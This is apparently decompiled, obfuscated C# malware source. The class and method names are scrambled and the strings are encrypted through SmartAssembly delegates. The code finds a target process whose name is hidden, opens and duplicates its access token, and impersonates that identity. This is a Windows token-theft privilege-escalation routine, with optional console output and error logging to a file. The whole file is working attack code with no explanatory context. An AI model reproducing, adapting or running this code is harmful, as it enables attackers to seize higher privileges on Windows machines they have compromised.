using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Principal;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace fAuBSMaVICral;

internal sealed class wRATPVNQGKWWa
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32", SetLastError = true)]
	[SuppressUnmanagedCodeSecurity]
	private static extern int OpenProcessToken(IntPtr intptr_0, int int_0, ref IntPtr intptr_1);

	[DllImport("kernel32", SetLastError = true)]
	[SuppressUnmanagedCodeSecurity]
	private static extern bool CloseHandle(IntPtr intptr_0);

	[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern bool DuplicateToken(IntPtr intptr_0, int int_0, ref IntPtr intptr_1);

	private static IntPtr tjXjkhVZvzhH(IntPtr intptr_0, int int_0)
	{
		IntPtr intptr_ = IntPtr.Zero;
		DuplicateToken(intptr_0, int_0, ref intptr_);
		return intptr_;
	}

	public static void aBfxypLUvpfe()
	{
		try
		{
			IntPtr intptr_ = IntPtr.Zero;
			IntPtr zero = IntPtr.Zero;
			Process process = null;
			Process[] processes = Process.GetProcesses();
			foreach (Process process2 in processes)
			{
				if (process2.ProcessName == YpCGOwjDWwATs.gUlAYNDfQee(getString_0(107460118)))
				{
					process = process2;
				}
			}
			if (OpenProcessToken(process.Handle, 14, ref intptr_) == 0)
			{
				return;
			}
			WindowsIdentity windowsIdentity = new WindowsIdentity(intptr_);
			if (YpCGOwjDWwATs.sHBjpbgVmkra)
			{
				try
				{
					Console.WriteLine(getString_0(107460069), windowsIdentity.Owner);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				zero = tjXjkhVZvzhH(intptr_, 2);
				_ = IntPtr.Zero == zero;
				windowsIdentity.Impersonate();
				IntPtr token = WindowsIdentity.GetCurrent().Token;
				if (YpCGOwjDWwATs.sHBjpbgVmkra)
				{
					try
					{
						Console.WriteLine(getString_0(107459548), token);
						Console.WriteLine(getString_0(107459503), WindowsIdentity.GetCurrent().Name);
						return;
					}
					catch (Exception)
					{
						return;
					}
				}
			}
			finally
			{
				CloseHandle(intptr_);
			}
		}
		catch (Exception ex3)
		{
			if (YpCGOwjDWwATs.IOdNTzsqoZWVAC)
			{
				try
				{
					File.AppendAllText(YpCGOwjDWwATs.kZGwVMpcMFQGdu, getString_0(107459422) + ex3.Message);
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	static wRATPVNQGKWWa()
	{
		Strings.CreateGetStringDelegate(typeof(wRATPVNQGKWWa));
	}
}
